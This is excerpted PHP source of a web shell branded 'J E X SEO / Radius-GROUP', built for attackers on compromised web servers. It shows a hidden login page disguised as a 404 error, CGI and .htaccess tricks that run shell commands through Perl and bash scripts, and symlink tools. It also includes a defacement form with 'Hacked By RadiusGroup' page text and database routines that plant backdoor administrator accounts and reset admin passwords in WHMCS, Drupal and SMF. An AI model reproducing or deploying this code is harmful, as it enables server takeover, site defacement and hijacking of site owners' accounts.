<?php
/*
	Author: 	J E X / Radius-GROUP
	Telegram: 	https://telegram.me/radiusgrup
	YouTube: 	https://youtube.com/radiusgrup
	Gmail:		jexseokeras@gmail.com
	Date:		Monday, November 19, 2025
*/
$GLOBALS['jexseo'] = array(
    'username' => 'JEXSEO',
    'password' => 'ee492bab2002bd982ca9a785aed74d4b',
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['jexseo'];
...
define("__ALFA_CODE_NAME__", "JEXSEO");
define("__ALFA_DATA_FOLDER__", "Radius-GROUP");
...
<title>.:: Radius - GROUP ::.</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="Radius-GROUP 2025" draggable="false" src="https://i.pinimg.com/originals/08/39/50/083950c527f464d967be48e78001d4cb.gif" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\'cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>-Silent Is Gold & Still Learning-</b></font></th></tr>
<tr><td bgcolor="black" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="green" face="DejaVu Sans" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="green" face="DejaVu Sans" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["radiuscgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["radiuscgiapi"])){
			if(!@file_exists("radiuscgiapi/".$_COOKIE["radiuscgiapi"].".jexseo")){
				$recreate = true;
				$lang = $_COOKIE["radiuscgiapi"];
			}
		}
		if(!isset($_COOKIE["radiuscgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".jexseo",$source);
			}
			alfacgihtaccess('cgi', "radiuscgiapi/");
		}else{
			$lang = $_COOKIE["radiuscgiapi"];
		}
		$cgi_ext = ".jexseo";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/radiuscgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("radiuscgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("radiuscgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<title>..:: '.$_SERVER['HTTP_HOST'].' J EX SEO - RadiusGROUP ::..</title>
<style type="text/css">';?>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?radius-group"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Radius-GROUP" draggable="false" src="https://i.pinimg.com/originals/08/39/50/083950c527f464d967be48e78001d4cb.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['alfamini']='https://2struggle.dev/icon/jokergemink.png';
	$s['loader']='https://2struggle.dev/icon/jokergemink.png';
...
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Radius-GROUP Uploader</option><option value='my'>My Private Shell</option></select>";
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://2struggle.dev/img/jexseo.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE~ &#9774;</font><br><b>
<font color='#00A220'>Shell Recoded by Radius-GROUP</font><br>
<font color='#00A220'>Contact : jexseokeras@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @radiusgrup</font><br>
<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
<font color='#FFFFFF'>Skype : jex.seo</font><br>
<font color='#FF0000'>Indonesian Hacker Rulez</font><br>
<font color='#FF0000'>Human Programmers</font><br>
...
$create = "insert into tblclients (email) values('radiusgrup@fbi.gov')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=radiusgrup@fbi.gov");
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["radiuscgiapi_mode"])&&!isset($_COOKIE["radiuscgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('radiuscgiapi',0755);
	__write_file("radiuscgiapi/".$name, __get_resource($source));
	@chmod("radiuscgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = alfaWriteTocgiapi("getheader.jexseo",$bash);
		$data = alfaEx("cd '{$tmp_path}/radiuscgiapi';sh getheader.jexseo",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ .::Radius-GROUP::. &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>jexseokeras[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@radiusgroup</a></span></div></td>
</tr>
</table>
</div>
...
function _alfa_symlink($target, $link){$phpsym= function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/radiuscgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/radiuscgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By RadiusGroup</title><b>Hacked By RadiusGroup</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By RadiusGroup";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By RadiusGRUP</title><b>Hacked By RadiusGRUP</b></textarea><br>
...
<title>Hacked By RadiusGRUP</title><b>Hacked By RadiusGRUP</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
<input type="text" name="defacer" size="67" id="text" placeholder="Radius-GROUP 2025" />
<br>
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'radiusgrup@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"UPDATE ".$prefix."users SET user_password ='".$hash."' WHEREuser_type = 3") or die(mysqli_error($conn));
...
$table = array('td1' =>
 ...
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'id'=>'db_user','inputName' => 'username', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'id'=>'db_pw','inputName' => 'password', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true)
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','radiusgrup@fbi.gov','filtered_html','1','Europe/Berlin','radiusgrup@fbi.gov')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','radiusgrup@fbi.gov')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgiradius/'.$cginame);
	}else{
		echo $resource;
	}
}
	...
	if($conn){
		if($type == "load_all_tables"){
			...
			if($type == "edit"){
				...
				if($row){
					$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE, DATA_TYPEas type FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
					$columns = array();
					$edit_data = array();
					while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://2struggle.dev/img/jexseo.png\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgiradius/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#Coded By J E X SEO - RadiusGroup\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .jexseo\nAddHandler cgi-script .jexseo";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.jexseo",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/radiuscgiapi;sh basedir.jexseo ".$makepwd,false,true,true);
...
function __alfa_open_archive_file($arch, $base_id=0){
	try{
		$files = array();
		$dirs = array();$archive = new PharData($arch);
...
if (!function_exists('json_encode')){
    function json_encode($a=false){
        ...
        if($isList)
        {
            foreach ($a as $v) $result[] = json_encode($v);return '[' . join(',', $result) . ']';
        }
        else
        {
